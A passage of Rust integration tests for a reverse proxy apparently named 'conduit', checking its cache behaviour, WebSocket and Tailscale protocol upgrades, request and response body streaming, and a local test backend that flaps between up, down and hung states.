    assert_eq!(r.header("cache-status"), Some("conduit; fwd=miss; stored"));
    let r = get("cache.test", "/fresh", &[]);
    assert_eq!(r.body, "/fresh #1");
    assert_eq!(r.header("cache-status"), Some("conduit; hit"));
    assert_eq!(count("/fresh"), 1);
    // The query is part of the key; so is the host's site.
    assert_eq!(get("cache.test", "/fresh?v=2", &[]).body, "/fresh?v=2 #2");
    assert_eq!(get("nocache.test", "/fresh", &[]).body, "/fresh #3");
    assert_eq!(
        get("nocache.test", "/fresh", &[]).header("cache-status"),
        None
    );
    // What a trusted proxy says about the original host and scheme is part of the key.
    get(
        "cache.test",
        "/fresh/fwd",
        &[("X-Forwarded-Host", "evil.example")],
    );
    get(
        "cache.test",
        "/fresh/fwd",
        &[("X-Forwarded-Proto", "https")],
    );
    let r = get("cache.test", "/fresh/fwd", &[]);
    assert_eq!(r.header("cache-status"), Some("conduit; fwd=miss; stored"));
    assert_eq!(count("/fresh/fwd"), 3);

    // Never stored: Set-Cookie, private, Authorization without public/s-maxage, no
    // freshness information, and methods other than GET and HEAD.
    for path in ["/cookie", "/private", "/plain"] {
        get("cache.test", path, &[]);
        let r = get("cache.test", path, &[]);
        assert_eq!(
            r.header("cache-status"),
            Some("conduit; fwd=miss"),
            "{path}"
        );
        assert_eq!(count(path), 2, "{path}");
    }
    assert_eq!(
        get("cache.test", "/cookie", &[]).header("set-cookie"),
        Some("session=abc")
    );
    get("cache.test", "/auth", &[("Authorization", "Bearer a")]);
    get("cache.test", "/auth", &[("Authorization", "Bearer b")]);
    assert_eq!(count("/auth"), 2);
    let r = raw_http(
        http_port,
        "POST /fresh HTTP/1.1\r\nHost: cache.test\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
    );
    assert_eq!(r.header("cache-status"), Some("conduit; fwd=bypass"));

    // default_ttl covers responses that say nothing about caching.
    get("ttl.test", "/plain/x", &[]);
    assert_eq!(
        get("ttl.test", "/plain/x", &[]).header("cache-status"),
        Some("conduit; hit")
    );
    assert_eq!(count("/plain/x"), 1);

    // Vary: one entry per X-Lang.
    assert_eq!(
        get("cache.test", "/vary", &[("X-Lang", "en")]).body,
        "lang=en #1"
    );
    assert_eq!(
        get("cache.test", "/vary", &[("X-Lang", "fr")]).body,
        "lang=fr #2"
    );
    assert_eq!(
        get("cache.test", "/vary", &[("X-Lang", "en")]).body,
        "lang=en #1"
    );
    assert_eq!(
        get("cache.test", "/vary", &[("X-Lang", "fr")]).body,
        "lang=fr #2"
    );

    // An encoded entry only for clients that accept the encoding. (An unencoded answer
    // without Vary is fit for everyone, so it may later serve gzip clients too.)
    assert_eq!(
        get("cache.test", "/gz", &[("Accept-Encoding", "gzip")]).body,
        "GZIP #1"
    );
    assert_eq!(
        get("cache.test", "/gz", &[("Accept-Encoding", "br, gzip")]).body,
        "GZIP #1"
    );
    assert_eq!(get("cache.test", "/gz", &[]).body, "/gz #2");
    assert_eq!(
        get("cache.test", "/gz", &[("Accept-Encoding", "identity")]).body,
        "/gz #2"
    );
    assert_eq!(
        get("cache.test", "/gz", &[("Accept-Encoding", "gzip;q=0")]).body,
        "/gz #2"
    );
    assert_eq!(count("/gz"), 2);

    // Expired entries are revalidated with their validator; a 304 renews them.
    get("cache.test", "/etag", &[]);
    thread::sleep(Duration::from_millis(1500));
    let r = get("cache.test", "/etag", &[]);
    assert_eq!(r.body, "/etag #1");
    assert_eq!(
        r.header("cache-status"),
        Some("conduit; fwd=stale; fwd-status=304")
    );
    assert_eq!(
        get("cache.test", "/etag", &[]).header("cache-status"),
        Some("conduit; hit")
    );
    assert_eq!(count("/etag"), 2);

    // Larger than max_object_size: passed through whole, not stored.
    assert_eq!(get("cache.test", "/big", &[]).body.len(), 4096);
    assert_eq!(get("cache.test", "/big", &[]).body.len(), 4096);
    assert_eq!(count("/big"), 2);

    // Concurrent misses for one key wait on the first (the cache lock).
    let waiters: Vec<_> = (0..5)
        .map(|_| thread::spawn(move || http(http_port, "cache.test", "/slow", &[]).body))
        .collect();
    for w in waiters {
        assert_eq!(w.join().unwrap(), "/slow #1");
    }
    assert_eq!(count("/slow"), 1);

    // stale-while-revalidate: the stale copy now, a fresh one fetched in the background.
    get("cache.test", "/swr", &[]);
    thread::sleep(Duration::from_millis(1500));
    let r = get("cache.test", "/swr", &[]);
    assert_eq!(r.body, "/swr #1");
    assert_eq!(r.header("cache-status"), Some("conduit; hit; detail=stale"));
    wait_until("background revalidation", Duration::from_secs(5), || {
        count("/swr") == 2
    });
    wait_until("the new copy", Duration::from_secs(5), || {
        get("cache.test", "/swr", &[]).body == "/swr #2"
    });

    // stale-if-error: the upstream fails, the expired copy stands in.
    get("cache.test", "/sie", &[]);
    thread::sleep(Duration::from_millis(1500));
    down.store(true, Ordering::SeqCst);
    let r = get("cache.test", "/sie", &[]);
    assert_eq!((r.status, r.body.as_str()), (200, "/sie #1"), "{r:?}");
    assert_eq!(r.header("cache-status"), Some("conduit; hit; detail=stale"));
    // Without a cached copy the failure shows.
    assert_eq!(get("cache.test", "/fresh/new", &[]).status, 502);
    down.store(false, Ordering::SeqCst);

    // Purge through the admin listener.
    let purge = |q: &str| {
        raw_http(
            admin,
            &format!(
                "POST /cache/purge?{q} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
            ),
        )
    };
    let r = purge("site=cached&prefix=/fresh");
    assert_eq!(r.status, 200, "{r:?}");
    let v: serde_json::Value = serde_json::from_str(&r.body).unwrap();
    // /fresh, /fresh?v=2 and the three /fresh/fwd entries.
    assert_eq!(v["purged"], 5, "{v}");
    let r = get("cache.test", "/fresh", &[]);
    assert_eq!(r.header("cache-status"), Some("conduit; fwd=miss; stored"));
    assert_eq!(
        get("cache.test", "/vary", &[("X-Lang", "en")]).body,
        "lang=en #1"
    );
    assert_eq!(purge("site=nocache").status, 404);
    assert_eq!(purge("prefix=/").status, 400);
    assert_eq!(purge("site=cached&prefix=fresh").status, 400);
    let v: serde_json::Value = serde_json::from_str(&purge("site=cached").body).unwrap();
    assert!(v["purged"].as_u64().unwrap() >= 4, "{v}");
    assert_eq!(
        get("cache.test", "/vary", &[("X-Lang", "en")]).body,
        "lang=en #3"
    );

    // Metrics, /status and the access log.
    let m = http(admin, "localhost", "/metrics", &[]).body;
    assert!(
        metric(
            &m,
            "conduit_cache_requests_total",
            &["site=\"cached\"", "result=\"hit\""]
        )
        .unwrap()
            >= 5.0
    );
    assert!(
        metric(
            &m,
            "conduit_cache_requests_total",
            &["site=\"cached\"", "result=\"stale\""]
        )
        .unwrap()
            >= 2.0
    );
    assert!(metric(&m, "conduit_cache_objects", &[]).unwrap() >= 1.0);
    assert!(metric(&m, "conduit_cache_size_bytes", &[]).unwrap() > 0.0);
    assert!(metric(&m, "conduit_cache_requests_total", &["site=\"nocache\""]).is_none());
    let s = status_json(admin);
    assert!(s["cache"]["objects"].as_u64().unwrap() >= 1);
    assert_eq!(s["cache"]["max_object_size"], 1024);
    wait_until("access log", Duration::from_secs(5), || {
        let log = std::fs::read_to_string(dir.join("access.log")).unwrap_or_default();
        log.contains("\"cache\":\"hit\"") && log.contains("\"cache\":\"bypass\"")
    });
}

/// Request heads an upgrade upstream received, in order.
type Heads = Arc<std::sync::Mutex<Vec<String>>>;

/// Reads up to and including the blank line that ends an HTTP head, one byte at a time so
/// nothing after it (upgraded bytes) is consumed. Empty on EOF.
fn read_head(s: &mut impl Read) -> String {
    let mut head = Vec::new();
    let mut b = [0u8; 1];
    while !head.ends_with(b"\r\n\r\n") {
        match s.read(&mut b) {
            Ok(1) => head.push(b[0]),
            _ => return String::new(),
        }
    }
    String::from_utf8_lossy(&head).into_owned()
}

fn head_value(head: &str, name: &str) -> Option<String> {
    head.lines().skip(1).find_map(|l| {
        let (k, v) = l.split_once(':')?;
        k.trim()
            .eq_ignore_ascii_case(name)
            .then(|| v.trim().to_string())
    })
}

/// Switches protocols for any `Upgrade` it receives and then echoes, like a WebSocket or
/// Tailscale control server. Without an `Upgrade` header, or on `/decline` (a server that
/// refuses to switch), it reads the body and answers `200 plain`.
fn upgrade_upstream() -> (u16, Heads) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let heads: Heads = Arc::default();
    let h = heads.clone();
    thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            let heads = h.clone();
            thread::spawn(move || {
                let head = read_head(&mut stream);
                if head.is_empty() {
                    return;
                }
                heads.lock().unwrap().push(head.clone());
                let upgrade = head_value(&head, "upgrade");
                if upgrade.is_none() || head.starts_with("POST /decline ") {
                    let len = head_value(&head, "content-length").map_or(0, |v| v.parse().unwrap());
                    let mut body = vec![0; len];
                    if stream.read_exact(&mut body).is_ok() {
                        let _ = stream.write_all(
                            b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: close\r\n\r\nplain",
                        );
                    }
                    return;
                }
                let _ = write!(
                    stream,
                    "HTTP/1.1 101 Switching Protocols\r\nUpgrade: {}\r\nConnection: Upgrade\r\n\r\n",
                    upgrade.unwrap()
                );
                let mut buf = [0u8; 8192];
                while let Ok(n @ 1..) = stream.read(&mut buf) {
                    if stream.write_all(&buf[..n]).is_err() {
                        return;
                    }
                }
            });
        }
    });
    (port, heads)
}

/// Sends `request` and reads the response head, leaving the stream at the upgraded bytes.
fn open_upgrade(port: u16, request: &str) -> (TcpStream, String) {
    let mut s = TcpStream::connect(("127.0.0.1", port)).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(request.as_bytes()).unwrap();
    let head = read_head(&mut s);
    (s, head)
}

fn websocket_request(host: &str) -> String {
    format!(
        "GET /socket HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\
         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n"
    )
}

/// What a Tailscale client sends to headscale: not a WebSocket.
fn tailscale_request(host: &str) -> String {
    format!(
        "POST /ts2021 HTTP/1.1\r\nHost: {host}\r\nUpgrade: tailscale-control-protocol\r\n\
         Connection: upgrade\r\nX-Tailscale-Handshake: AAAA\r\nKeep-Alive: timeout=5\r\n\
         TE: trailers\r\nContent-Length: 0\r\n\r\n"
    )
}

fn echo(s: &mut TcpStream, data: &[u8]) {
    s.write_all(data).unwrap();
    let mut back = vec![0; data.len()];
    s.read_exact(&mut back).unwrap();
    assert_eq!(back, data);
}

/// Seconds until the proxy closes a connection on which nobody sends anything.
fn idle_close(s: &mut TcpStream) -> Duration {
    let start = Instant::now();
    let mut b = [0u8; 1];
    let n = s.read(&mut b).unwrap_or(0);
    assert_eq!(n, 0, "data on an idle connection");
    start.elapsed()
}

#[test]
fn protocol_upgrades() {
    let dir = test_dir("upgrade-proto");
    let (up, heads) = upgrade_upstream();
    let (http_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    let cfg = format!(
        r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
sites:
  - id: ws
    hosts: [ws.test]
    upstream: http://127.0.0.1:{up}
    max_body_size: 1k
    read_timeout: 2s
  - id: any
    hosts: [any.test]
    upstream: http://127.0.0.1:{up}
    upgrade: any
    upgrade_idle_timeout: 2s
    max_body_size: 1k
  - id: off
    hosts: [off.test]
    upstream: http://127.0.0.1:{up}
    upgrade: off
  - id: cached
    hosts: [cache.test]
    upstream: http://127.0.0.1:{up}
    cache: true
"#,
        d = dir.display()
    );
    std::fs::write(&cfg_path, &cfg).unwrap();
    let proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let last_head = || heads.lock().unwrap().last().cloned().unwrap();

    // WebSocket (the default mode): switched, and the stream is not a request body, so far
    // more than max_body_size (1k) flows both ways.
    let (mut s, head) = open_upgrade(http_port, &websocket_request("ws.test"));
    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
    let up_head = last_head();
    assert_eq!(
        head_value(&up_head, "upgrade").as_deref(),
        Some("websocket")
    );
    assert!(
        head_value(&up_head, "sec-websocket-key").is_some(),
        "{up_head}"
    );
    for i in 0..8u8 {
        echo(&mut s, &[b'a' + i; 1024]);
    }
    drop(s);

    // The default mode passes WebSockets only: Tailscale's upgrade arrives as a plain request.
    let (_s, head) = open_upgrade(http_port, &tailscale_request("ws.test"));
    assert!(head.starts_with("HTTP/1.1 200"), "{head}");
    assert_eq!(head_value(&last_head(), "upgrade"), None);

    // `upgrade: any` (headscale): the handshake reaches the upstream intact, minus the
    // hop-by-hop headers no handshake needs, and the connection switches.
    let (mut s, head) = open_upgrade(http_port, &tailscale_request("any.test"));
    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
    let up_head = last_head();
    assert!(up_head.starts_with("POST /ts2021 "), "{up_head}");
    assert_eq!(
        head_value(&up_head, "upgrade").as_deref(),
        Some("tailscale-control-protocol")
    );
    assert_eq!(
        head_value(&up_head, "connection").as_deref(),
        Some("upgrade")
    );
    assert_eq!(
        head_value(&up_head, "x-tailscale-handshake").as_deref(),
        Some("AAAA")
    );
    assert_eq!(head_value(&up_head, "keep-alive"), None, "{up_head}");
    assert_eq!(head_value(&up_head, "te"), None, "{up_head}");
    echo(&mut s, &[7; 4096]);
    drop(s);

    // `upgrade: off`: even a WebSocket handshake stays an ordinary request.
    let (_s, head) = open_upgrade(http_port, &websocket_request("off.test"));
    assert!(head.starts_with("HTTP/1.1 200"), "{head}");
    assert_eq!(head_value(&last_head(), "upgrade"), None);

    // An Upgrade header alone does not lift max_body_size: only a completed switch does.
    let body = "x".repeat(4096);
    let (_s, head) = open_upgrade(
        http_port,
        &format!(
            "POST /decline HTTP/1.1\r\nHost: any.test\r\nUpgrade: foo\r\nConnection: upgrade\r\n\
             Content-Length: {}\r\n\r\n{body}",
            body.len()
        ),
    );
    assert!(head.starts_with("HTTP/1.1 413"), "{head}");

    // Idle limit: upgrade_idle_timeout, or the site's read_timeout when unset.
    for (host, request) in [
        ("any.test", tailscale_request("any.test")),
        ("ws.test", websocket_request("ws.test")),
    ] {
        let (mut s, head) = open_upgrade(http_port, &request);
        assert!(head.starts_with("HTTP/1.1 101"), "{host}: {head}");
        let idle = idle_close(&mut s);
        assert!(
            idle >= Duration::from_millis(1500) && idle < Duration::from_secs(6),
            "{host}: closed after {idle:?}, expected ~2s"
        );
    }
    // Traffic in either direction keeps it open past the limit.
    let (mut s, _) = open_upgrade(http_port, &websocket_request("ws.test"));
    for _ in 0..7 {
        thread::sleep(Duration::from_millis(500));
        echo(&mut s, b"ping");
    }
    drop(s);

    // A cache-enabled site never caches an upgrade, and a reload leaves open upgraded
    // connections alone.
    let (mut s, head) = open_upgrade(http_port, &websocket_request("cache.test"));
    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
    echo(&mut s, b"before reload");
    let extra =
        format!("  - id: new\n    hosts: [new.test]\n    upstream: http://127.0.0.1:{up}\n");
    std::fs::write(&cfg_path, cfg.clone() + &extra).unwrap();
    signal(proxy.child.id(), "-HUP");
    wait_until(
        "reload picks up the new site",
        Duration::from_secs(10),
        || http(http_port, "new.test", "/", &[]).status == 200,
    );
    echo(&mut s, b"after reload");
    drop(s);

    // One access log line per upgraded connection, written when it ends, with the bytes the
    // client sent through it and no error (a stream cut by the body limit logs one).
    wait_until(
        "access log of the upgraded connections",
        Duration::from_secs(5),
        || {
            let log = std::fs::read_to_string(dir.join("access.log")).unwrap_or_default();
            log.lines().any(|l| {
                l.contains("\"host\":\"ws.test\"")
                    && l.contains("\"status\":101")
                    && l.contains("\"bytes_received\":8192")
                    && !l.contains("\"error\"")
            })
        },
    );
}

/// Bytes that look like nothing in particular, CR and LF included.
fn noise(len: usize, seed: u64) -> Vec<u8> {
    let mut x = seed | 1;
    (0..len)
        .map(|_| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            x as u8
        })
        .collect()
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// An upstream that answers a request body (Content-Length or chunked) with its length and
/// SHA-256, and `GET /stream/<n>` with n bytes. Under `/slow` it reads bodies 4 KiB at a time
/// with a pause after each piece, so the proxy has to hold the client back.
fn body_upstream() -> u16 {
    fn read_n(r: &mut impl BufRead, mut left: usize, slow: bool, out: &mut Vec<u8>) -> Option<()> {
        while left > 0 {
            let take = if slow { left.min(4096) } else { left };
            let start = out.len();
            out.resize(start + take, 0);
            r.read_exact(&mut out[start..]).ok()?;
            left -= take;
            if slow {
                thread::sleep(Duration::from_millis(1));
            }
        }
        Some(())
    }
    fn serve(stream: TcpStream) -> Option<()> {
        let mut r = BufReader::new(stream.try_clone().ok()?);
        let mut w = stream;
        loop {
            let mut head = Vec::new();
            loop {
                let mut line = String::new();
                if r.read_line(&mut line).ok()? == 0 {
                    return None;
                }
                if line == "\r\n" {
                    break;
                }
                head.push(line.to_ascii_lowercase());
            }
            let target = head[0].split_whitespace().nth(1)?.to_string();
            let slow = target.starts_with("/slow");
            let header = |name: &str| {
                head.iter()
                    .find_map(|l| l.strip_prefix(name).map(|v| v.trim().to_string()))
            };
            let mut body = Vec::new();
            if header("transfer-encoding:").as_deref() == Some("chunked") {
                loop {
                    let mut line = String::new();
                    r.read_line(&mut line).ok()?;
                    let size = usize::from_str_radix(line.trim().split(';').next()?, 16).ok()?;
                    if size == 0 {
                        while r.read_line(&mut line).ok()? > 0 && !line.ends_with("\r\n\r\n") {
                            if line == "0\r\n\r\n" || line.trim().is_empty() {
                                break;
                            }
                        }
                        break;
                    }
                    read_n(&mut r, size, slow, &mut body)?;
                    r.read_line(&mut String::new()).ok()?;
                }
            } else if let Some(len) = header("content-length:") {
                read_n(&mut r, len.parse().ok()?, slow, &mut body)?;
            }
            if let Some(n) = target.strip_prefix("/stream/") {
                let n: usize = n.parse().ok()?;
                w.write_all(format!("HTTP/1.1 200 OK\r\nContent-Length: {n}\r\n\r\n").as_bytes())
                    .ok()?;
                let chunk = noise(65536, 7);
                let mut left = n;
                while left > 0 {
                    let take = left.min(chunk.len());
                    w.write_all(&chunk[..take]).ok()?;
                    left -= take;
                }
            } else {
                let reply = format!("{} {}", body.len(), hex(&openssl::sha::sha256(&body)));
                w.write_all(
                    format!(
                        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{reply}",
                        reply.len()
                    )
                    .as_bytes(),
                )
                .ok()?;
            }
        }
    }
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            thread::spawn(move || serve(stream));
        }
    });
    port
}

/// One request on a kept-alive connection; the response status and body.
fn body_exchange(
    r: &mut BufReader<TcpStream>,
    method: &str,
    path: &str,
    body: &[u8],
    chunked: bool,
) -> (u16, Vec<u8>) {
    let mut w = r.get_ref().try_clone().unwrap();
    let framing = if chunked {
        "Transfer-Encoding: chunked".to_string()
    } else {
        format!("Content-Length: {}", body.len())
    };
    w.write_all(
        format!("{method} {path} HTTP/1.1\r\nHost: body.test\r\n{framing}\r\n\r\n").as_bytes(),
    )
    .unwrap();
    if chunked {
        // Uneven chunks, so they straddle the proxy's reads.
        let mut rest = body;
        let mut size = 1;
        while !rest.is_empty() {
            let take = size.min(rest.len());
            w.write_all(format!("{take:x}\r\n").as_bytes()).unwrap();
            w.write_all(&rest[..take]).unwrap();
            w.write_all(b"\r\n").unwrap();
            rest = &rest[take..];
            size = size * 7 % 9001 + 1;
        }
        w.write_all(b"0\r\n\r\n").unwrap();
    } else {
        w.write_all(body).unwrap();
    }
    let mut status = String::new();
    r.read_line(&mut status).unwrap();
    let mut len = 0;
    loop {
        let mut line = String::new();
        r.read_line(&mut line).unwrap();
        if line == "\r\n" {
            break;
        }
        if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") {
            len = v.trim().parse().unwrap();
        }
    }
    let mut resp = vec![0; len];
    r.read_exact(&mut resp).unwrap();
    let code = status.split_whitespace().nth(1).unwrap().parse().unwrap();
    (code, resp)
}

/// Request bodies of every size and framing, fast and slow upstream reads, uploads in parallel
/// and a large response, all through the task pipes between the proxy's two halves.
#[test]
fn request_and_response_bodies() {
    let dir = test_dir("bodies");
    let upstream = body_upstream();
    let http_port = free_port();
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
access_log:
  path: {d}/access.log
sites:
  - id: bodies
    hosts: [body.test]
    upstream: http://127.0.0.1:{upstream}
    max_body_size: 16m
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let connect = move || {
        let s = TcpStream::connect(("127.0.0.1", http_port)).unwrap();
        s.set_read_timeout(Some(Duration::from_secs(20))).unwrap();
        BufReader::new(s)
    };
    let want = |body: &[u8]| format!("{} {}", body.len(), hex(&openssl::sha::sha256(body)));

    // One connection, kept alive across every request.
    let mut conn = connect();
    for (i, size) in [0, 1, 65_536, 3_000_000].into_iter().enumerate() {
        let body = noise(size, i as u64 + 1);
        for path in ["/fast", "/slow"] {
            if path == "/slow" && size > 1_000_000 {
                continue;
            }
            for chunked in [false, true] {
                let (status, resp) = body_exchange(&mut conn, "POST", path, &body, chunked);
                assert_eq!(status, 200, "{size} bytes to {path}, chunked {chunked}");
                assert_eq!(
                    String::from_utf8_lossy(&resp),
                    want(&body),
                    "{size} bytes to {path}, chunked {chunked}"
                );
            }
        }
    }
    // A slow upstream and a body far larger than the pipes and socket buffers hold.
    let body = noise(1_000_000, 9);
    let (status, resp) = body_exchange(&mut conn, "PUT", "/slow/put", &body, true);
    assert_eq!(
        (status, String::from_utf8_lossy(&resp).into_owned()),
        (200, want(&body))
    );

    // Uploads in parallel, three per connection.
    let uploads: Vec<_> = (0..8)
        .map(|t| {
            thread::spawn(move || {
                let mut conn = connect();
                for k in 0..3 {
                    let body = noise(200_000 + t * 1000 + k, (t * 10 + k) as u64);
                    let (status, resp) =
                        body_exchange(&mut conn, "POST", "/fast", &body, k % 2 == 1);
                    assert_eq!(status, 200);
                    assert_eq!(String::from_utf8_lossy(&resp), want(&body));
                }
            })
        })
        .collect();
    for u in uploads {
        u.join().unwrap();
    }

    // A response much larger than the pipe, read to the end.
    let (status, resp) = body_exchange(&mut conn, "GET", "/stream/20000000", b"", false);
    assert_eq!(status, 200);
    assert_eq!(resp.len(), 20_000_000);
    assert!(resp.chunks(65536).all(|c| c == &noise(65536, 7)[..c.len()]));
}

/// [`Flappy`] state: answering.
const UP: u8 = 0;
/// Port closed (connecting is refused) and every open connection shut down, as when the
/// backend process dies.
const DOWN: u8 = 1;
/// Requests are read but never answered, as when the backend is stuck.
const HANG: u8 = 2;

/// Keep-alive backend that the test switches between [`UP`], [`DOWN`] and [`HANG`] while
/// traffic runs. It answers with the request body, the path in `X-Path` and its port in
/// `X-Backend`.
struct Flappy {
    port: u16,
    mode: Arc<AtomicU8>,
    /// The mode the listener thread has put into effect.
    applied: Arc<AtomicU8>,
}

impl Flappy {
    fn start() -> Flappy {
        let port = free_port();
        let mode = Arc::new(AtomicU8::new(UP));
        let applied = Arc::new(AtomicU8::new(u8::MAX));
        let (m, a) = (mode.clone(), applied.clone());
        thread::spawn(move || {
            let conns = Arc::new(Mutex::new(Vec::<TcpStream>::new()));
            let mut listener: Option<TcpListener> = None;
            loop {
                let want = m.load(Ordering::SeqCst);
                if want == DOWN {
                    if listener.take().is_some() {
                        for c in conns.lock().unwrap().drain(..) {
                            let _ = c.shutdown(std::net::Shutdown::Both);
                        }
                    }
                    a.store(DOWN, Ordering::SeqCst);
                    thread::sleep(Duration::from_millis(1));
                    continue;
                }
                if listener.is_none() {
                    match TcpListener::bind(("127.0.0.1", port)) {
                        Ok(l) => {
                            l.set_nonblocking(true).unwrap();
                            listener = Some(l);
                        }
                        Err(_) => {
                            thread::sleep(Duration::from_millis(1));
                            continue;
                        }
                    }
                }
                a.store(want, Ordering::SeqCst);
                match listener.as_ref().unwrap().accept() {
                    Ok((s, _)) => {
                        s.set_nonblocking(false).unwrap();
                        conns.lock().unwrap().push(s.try_clone().unwrap());
                        let m = m.clone();
                        thread::spawn(move || serve_flappy(s, port, &m));
                    }
                    Err(_) => thread::sleep(Duration::from_millis(1)),
                }
            }
        });
        let f = Flappy {
            port,
            mode,
            applied,
        };
        f.set(UP);
        f
    }

    /// Switches the mode and returns once it is in effect.
    fn set(&self, mode: u8) {
        self.mode.store(mode, Ordering::SeqCst);
        let deadline = Instant::now() + Duration::from_secs(5);
        while self.applied.load(Ordering::SeqCst) != mode {
            assert!(
                Instant::now() < deadline,
                "backend {} did not switch",
                self.port
            );
            thread::sleep(Duration::from_micros(200));
        }
    }
}

fn serve_flappy(stream: TcpStream, port: u16, mode: &AtomicU8) {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut stream = stream;
    loop {
        let mut head = String::new();
        loop {
            let mut line = String::new();
            if reader.read_line(&mut line).unwrap_or(0) == 0 {
                return;
            }
            if line == "\r\n" {
                break;
            }
            head.push_str(&line);
        }
        let path = head.split(' ').nth(1).unwrap_or("").to_string();
        let len = head
            .lines()
            .find_map(|l| {
                l.to_ascii_lowercase()
                    .strip_prefix("content-length:")
                    .map(|v| v.trim().parse().unwrap_or(0))
            })
            .unwrap_or(0usize);
        let mut body = vec![0; len];
        if reader.read_exact(&mut body).is_err() {
            return;
        }
        while mode.load(Ordering::SeqCst) == HANG {
            thread::sleep(Duration::from_millis(5));
        }
        if mode.load(Ordering::SeqCst) == DOWN {
            return;
        }
        let mut resp = format!(
            "HTTP/1.1 200 OK\r\nX-Backend: {port}\r\nX-Path: {path}\r\nContent-Length: {}\r\n\r\n",
            body.len()
        )
        .into_bytes();
        resp.extend_from_slice(&body);
        if stream.write_all(&resp).is_err() {
            return;
        }
    }
}

/// One request of the flapping test; times in microseconds since the test began.
struct Rec {
    start: u64,
    end: u64,
    /// 0: no answer.
    status: u16,
    backend: u16,
    kind: u8,
}

struct Answer {
    status: u16,
    backend: u16,
    path: String,
    body: Vec<u8>,
    close: bool,
}

/// Sends one request and reads its answer (`Content-Length` or chunked).
fn keepalive_exchange(conn: &mut BufReader<TcpStream>, req: &[u8]) -> Result<Answer, String> {
    conn.get_mut()
        .write_all(req)
        .map_err(|e| format!("write: {e}"))?;
    let mut line = String::new();
    match conn.read_line(&mut line) {
        Ok(0) => return Err("closed before answering".into()),
        Ok(_) => {}
        Err(e) => return Err(format!("read: {e}")),
    }
    let status = line
        .split(' ')
        .nth(1)
        .and_then(|s| s.parse().ok())
        .ok_or_else(|| format!("bad status line {line:?}"))?;
    let (mut len, mut chunked, mut close, mut backend, mut path) =
        (0, false, false, 0, String::new());
    loop {
        line.clear();
        conn.read_line(&mut line)
            .map_err(|e| format!("head: {e}"))?;
        if line == "\r\n" || line.is_empty() {
            break;
        }
        let (k, v) = line.split_once(':').unwrap_or((&line, ""));
        let v = v.trim();
        match k.to_ascii_lowercase().as_str() {
            "content-length" => len = v.parse().unwrap_or(0),
            "transfer-encoding" => chunked = v.eq_ignore_ascii_case("chunked"),
            "connection" => close = v.eq_ignore_ascii_case("close"),
            "x-backend" => backend = v.parse().unwrap_or(0),
            "x-path" => path = v.to_string(),
            _ => {}
        }
    }
    let mut body = Vec::new();
    if chunked {
        loop {
            line.clear();
            conn.read_line(&mut line)
                .map_err(|e| format!("chunk: {e}"))?;
            let n = usize::from_str_radix(line.trim(), 16).map_err(|_| "bad chunk size")?;
            let mut chunk = vec![0; n + 2];
            conn.read_exact(&mut chunk)
                .map_err(|e| format!("chunk: {e}"))?;
            if n == 0 {
                break;
            }
            body.extend_from_slice(&chunk[..n]);
        }
    } else {
        body.resize(len, 0);
        conn.read_exact(&mut body)
            .map_err(|e| format!("body: {e}"))?;
    }
    Ok(Answer {
        status,
        backend,
        path,
        body,
        close,
    })
}

/// Client loop of the flapping test. `kind`: bit 0 POST (else GET), bit 1 a new connection
/// per request (else keep-alive). Returns its requests and every answer that did not match
/// its request.
fn flap_client(
    port: u16,
    kind: u8,
    id: usize,
    t0: Instant,
    stop: Arc<AtomicBool>,
) -> (Vec<Rec>, Vec<String>) {
    let (post, fresh) = (kind & 1 != 0, kind & 2 != 0);
    let (mut recs, mut bad) = (Vec::new(), Vec::new());
    let mut conn: Option<BufReader<TcpStream>> = None;
    let mut seq = 0;
    while !stop.load(Ordering::Relaxed) {
        seq += 1;
        let path = format!("/c{id}/{seq}");
        let body = if post {
            format!("body {id} {seq}")
        } else {
            String::new()
        };
        let close = if fresh { "Connection: close\r\n" } else { "" };
        let req = if post {
            format!(
                "POST {path} HTTP/1.1\r\nHost: flap.test\r\nContent-Length: {}\r\n{close}\r\n{body}",
                body.len()
            )
        } else {
            format!("GET {path} HTTP/1.1\r\nHost: flap.test\r\n{close}\r\n")
        };
        let start = t0.elapsed().as_micros() as u64;
        let c = conn.get_or_insert_with(|| {
            let s = TcpStream::connect(("127.0.0.1", port)).expect("conduit accepts");
            s.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
            s.set_nodelay(true).unwrap();
            BufReader::new(s)
        });
        let r = keepalive_exchange(c, req.as_bytes());
        let end = t0.elapsed().as_micros() as u64;
        let (status, backend) = match r {
            Ok(a) => {
                if a.status == 200 && (a.path != path || a.body != body.as_bytes()) {
                    bad.push(format!(
